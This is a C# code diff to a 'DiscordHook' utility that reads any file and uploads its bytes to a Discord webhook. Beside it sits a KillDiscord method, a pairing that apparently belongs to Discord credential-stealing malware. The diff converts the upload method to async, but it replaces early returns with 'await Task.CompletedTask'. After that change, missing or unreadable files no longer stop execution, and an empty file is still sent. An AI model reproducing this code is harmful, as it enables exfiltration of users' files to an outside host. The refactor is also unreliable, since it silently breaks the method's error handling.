@@ -3,14 +3,15 @@ using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Text;
+using System.Threading.Tasks;
 
 namespace DiscordHook
 {
     public static class Utility
     {
-        public static void SendFileHook(string dshook, FileInfo file)
+        public static async Task SendFileHook(string dshook, FileInfo file)
         {
-            if (!file.Exists) return;
+            if (!file.Exists) await Task.CompletedTask;
             var bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
             var webhookRequest = new WebClient();
             webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
@@ -21,14 +22,14 @@ namespace DiscordHook
             var fileBody = "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.Name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
             var fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
             stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
-            byte[] fileBuffer;
+            var fileBuffer = new byte[] { };
             try
             {
                 fileBuffer = File.ReadAllBytes(file.FullName);
             }
-            catch 
+            catch
             {
-                return;
+                await Task.CompletedTask;
             }
             
             stream.Write(fileBuffer, 0, fileBuffer.Length);
@@ -40,6 +41,7 @@ namespace DiscordHook
             var jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
             stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
             webhookRequest.UploadData(dshook, stream.ToArray());
+            await Task.CompletedTask;
         }
 
         public static void KillDiscord()
